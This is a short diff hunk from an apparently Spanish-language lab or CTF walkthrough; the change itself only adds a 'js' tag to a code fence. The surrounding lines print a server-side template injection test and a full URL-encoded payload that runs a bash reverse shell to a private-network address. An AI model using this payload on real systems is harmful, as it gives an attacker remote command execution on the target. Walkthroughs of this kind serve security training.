@@ -214,7 +214,7 @@ http://192.168.0.106:9999/?name={{7*7}}
 
 - Y ahora lo que resta por hacer es mandarnos una reverse shell:
 
-```
+```js
 http://192.168.0.106:9999/?name={%%20import%20os%20%}{{os.system(%27bash -c "bash -i >%26 /dev/tcp/192.168.0.145/443 0>%261"%27)}}
 ```
 
